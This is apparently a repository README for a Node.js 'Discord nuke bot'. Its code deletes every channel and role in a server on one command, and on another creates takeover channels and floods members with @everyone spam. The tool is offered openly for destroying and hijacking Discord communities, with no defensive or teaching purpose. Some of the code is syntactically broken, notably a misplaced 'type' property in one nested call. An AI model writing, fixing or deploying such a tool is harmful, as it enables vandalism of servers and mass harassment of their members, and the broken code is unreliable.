# Discord-nuke-bot
This discord nuke bot is using Node.js

Code:

const Discord = require('discord.js');
const client = new Discord.Client();


client.login(process.env.TOKEN)


client.on('message', async (message) => {
  if (message.content === 'o.restart') {
    message.guild.channels.cache.forEach
    (channel => channel.delete());


    message.guild.roles.cache.forEach
(role => role.delete());

await message.guild.channels.create
('This server has been restarted', {
  type : 'text'
}).then(async channel=> {
  channel.send('@everyone This server has been restarted. do o.nuke to nuke the server and o.restart to restart the server.')
})
  }
})


client.on('message', async (message) => {
  if (message.content === 'o.nuke') {
    await message.guild.channels.create
('Its our server now', {
  type : 'text'
}).then(async channel=> {
  await message.guild.channels.create
  type : 'text'
('Its our server now', {
}).then(async channel=> {
  await message.guild.channels.create
('Its our server now', {
  type : 'text'
}).then(async channel=> {
  channel.send('o.nuke')
  await message.guild.channels.create
('Its our server now', {
  type : 'text'
}).then(async channel=> {
  await message.guild.channels.create
('Its our server now', {
  type : 'text'
}).then(async channel=> {
  channel.send('@everyone Its our server now')
  await message.guild.channels.create
('Its our server now', {
  type : 'text'
}).then(async channel=> {
  channel.send('@everyone Its our server now')
  channel.send('@everyone Its our server now')
  channel.send('@everyone Its our server now')
  channel.send('@everyone Its our server now')
    message.channel.send('@everyone This is our sevrer now')
    message.channel.send('@everyone This is our sevrer now')
    message.channel.send('@everyone This is our sevrer now')
     message.channel.send('@everyone This is our sevrer now')
      message.channel.send('@everyone This is our sevrer now')
       message.channel.send('@everyone This is our sevrer now')
        message.channel.send('@everyone This is our sevrer now')
  })
  })
  })
})
  })
})
  }
})

client.login('PLACE TOKEN HERE')
